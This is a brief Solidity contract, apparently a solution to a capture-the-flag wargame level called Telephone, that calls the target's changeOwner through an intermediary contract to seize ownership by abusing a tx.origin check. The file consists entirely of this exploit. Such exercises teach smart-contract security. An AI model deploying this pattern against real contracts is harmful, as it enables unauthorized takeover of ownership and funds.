// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneAttacker {
  Telephone private _telephone;

  constructor(Telephone telephone) {
    _telephone = telephone;
  }

  function changeOwner() public {
    _telephone.changeOwner(msg.sender);
  }
}
